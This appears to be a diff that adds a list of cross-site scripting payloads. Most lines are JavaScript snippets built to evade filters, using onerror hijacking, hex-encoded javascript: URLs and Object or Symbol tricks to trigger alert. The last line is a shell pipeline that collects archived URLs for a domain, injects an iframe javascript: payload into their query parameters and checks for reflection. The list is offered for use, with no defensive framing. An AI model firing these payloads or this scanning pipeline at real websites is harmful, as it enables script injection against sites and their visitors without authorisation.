@@ -1,0 +1,12 @@
+alert({PAYLOAD})
+confirm({PAYLOAD})
+print({PAYLOAD})
+[0].with(0,alert).splice(0,1).at(0)({PAYLOAD});
+shahmidoe:onerror=alert}=0,throw 1337;
+location.assign('#javascript:\x61\x6c\x65\x72\x74\x281337\x29');
+location.hash.slice(1).replace(globalThis, globalThis[Symbol[`${`replace`}`]]=setTimeout);
+Object.assign({x:0},{x:onerror=alert});throw 7;
+Object.create({},{x:{value:onerror=alert}}); throw 7;
+Object.getOwnPropertyDescriptors({x:onerror=alert}).value; throw 7;
+Object.fromEntries((new Map).add('x',onerror=alert));throw 1337;
+echo test(.)com | waybackurls | grep "=" | grep -Ev "\.(svg|jpg|jpeg|png|gif|ico|bmp|webp|otf|eot|tif|tiff|ttf|woff|woff2|pdf|txt|js|css)" | gouro | qsreplace -a '"><iframe/src=javascript:alert(document.domain)>' | fff -k -M 'alert(document.domain)'
